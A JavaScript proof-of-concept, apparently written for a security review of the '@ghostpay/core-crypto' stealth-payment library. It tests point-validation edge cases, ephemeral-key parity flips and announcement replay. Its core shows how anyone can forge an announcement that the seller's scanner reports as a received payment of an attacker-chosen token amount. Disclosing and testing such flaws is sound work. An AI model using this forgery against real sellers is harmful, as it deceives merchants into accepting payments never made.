// PoC: (a) point-validation edge cases; (b) anybody can forge a "payment" announcement that the seller's scanner
// reports as a match with an attacker-chosen amount/token (no on-chain value is needed); (c) ephemeral-key parity flip.
import {
  generateKeySet, encodeMetaAddress, deriveStealthPayment, checkAnnouncement, parseCompressedPoint,
  buildErc20Metadata, parseMetadata, decodeMetaAddress,
} from '@ghostpay/core-crypto';
import { secp256k1 } from '@noble/curves/secp256k1.js';
import { bytesToHex, hexToBytes } from '@noble/hashes/utils.js';

const t = (name, f) => { try { const r = f(); console.log('accepted ', name, r ?? ''); } catch (e) { console.log('rejected ', name, '->', e.code ?? e.message); } };
const P = secp256k1.Point.Fn.ORDER; // n
const p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn;
const hx = (n) => n.toString(16).padStart(64, '0');
console.log('--- (a) point validation');
t('infinity 0x00', () => parseCompressedPoint(Uint8Array.of(0)));
t('33 zero bytes', () => parseCompressedPoint(new Uint8Array(33)));
t('02||x=p (x>=p)', () => parseCompressedPoint(hexToBytes('02' + hx(p))));
t('02||x=0 (no sqrt? )', () => parseCompressedPoint(hexToBytes('02' + hx(0n))));
t('02||x=5 (off-curve for secp256k1? y^2=132)', () => parseCompressedPoint(hexToBytes('02' + hx(5n))));
t('uncompressed 04..', () => parseCompressedPoint(hexToBytes('04' + hx(secp256k1.Point.BASE.x) + hx(secp256k1.Point.BASE.y))));
t('hybrid 06/07', () => parseCompressedPoint(hexToBytes('06' + hx(secp256k1.Point.BASE.x))));
t('valid G compressed', () => 'ok ' + bytesToHex(parseCompressedPoint(secp256k1.Point.BASE.toBytes(true))).slice(0, 8));
t('meta-address uppercase hex body', () => { const k = generateKeySet(); return decodeMetaAddress(encodeMetaAddress(k).toUpperCase().replace('ST:ETH:0X', 'st:eth:0x')).spendingPublicKey.length; });
t('meta-address with trailing newline', () => decodeMetaAddress(encodeMetaAddress(generateKeySet()) + '\n'));

console.log('--- (b) forged announcement (no payment ever made)');
const seller = generateKeySet();
const meta = encodeMetaAddress(seller); // public: it is in every invoice link
const fake = deriveStealthPayment(meta);
const token = '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238';
const claimed = 1_000_000_000_000n; // "1,000,000 USDC"
const md = buildErc20Metadata(fake.viewTag, token, claimed);
const ann = { schemeId: 1n, stealthAddress: fake.stealthAddress, ephemeralPublicKey: '0x' + bytesToHex(fake.ephemeralPublicKey), metadata: '0x' + bytesToHex(md) };
const hit = checkAnnouncement(ann, seller.viewingSecret, seller.spendingPublicKey);
console.log('scanner matches forged announcement:', hit.matches, '| metadata claims net =', parseMetadata(ann.metadata).netAmount.toString(), 'base units');
console.log('=> Scan.tsx prints this as "1000000 USDC ... (paid directly, no GhostPay fee)" with no balance/transfer check.');

console.log('--- (c) ephemeral key parity flip (R vs -R)');
const real = deriveStealthPayment(meta);
const ok = { schemeId: 1n, stealthAddress: real.stealthAddress, ephemeralPublicKey: '0x' + bytesToHex(real.ephemeralPublicKey), metadata: '0x' + bytesToHex(real.metadataPrefix) };
const flippedKey = (real.ephemeralPublicKey[0] === 2 ? '03' : '02') + bytesToHex(real.ephemeralPublicKey.subarray(1));
console.log('original matches:', checkAnnouncement(ok, seller.viewingSecret, seller.spendingPublicKey).matches);
console.log('flipped  matches:', checkAnnouncement({ ...ok, ephemeralPublicKey: '0x' + flippedKey }, seller.viewingSecret, seller.spendingPublicKey).matches, '(no malleability: S -> -S changes keccak(S))');
console.log('--- (d) replayed announcement duplicates: same (stealth,R,metadata) re-announced by anyone matches again:',
  checkAnnouncement(ok, seller.viewingSecret, seller.spendingPublicKey).matches);
